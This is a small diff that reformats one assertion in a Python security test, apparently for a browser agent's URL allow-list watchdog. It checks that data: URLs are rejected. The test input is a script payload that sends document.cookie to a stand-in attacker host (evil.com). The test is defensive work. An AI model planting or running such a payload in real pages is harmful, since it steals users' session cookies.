@@ -447,7 +447,9 @@ class TestUrlProhibitlistSecurity:
 
 		# The attack scenario from the issue: a data: URL embedding script that redirects/exfiltrates
 		assert (
-			watchdog._is_url_allowed('data:text/html,<script>document.location="https://evil.com/steal?c="+document.cookie</script>')
+			watchdog._is_url_allowed(
+				'data:text/html,<script>document.location="https://evil.com/steal?c="+document.cookie</script>'
+			)
 			is False
 		)
 		assert watchdog._is_url_allowed('data:text/plain,hello') is False
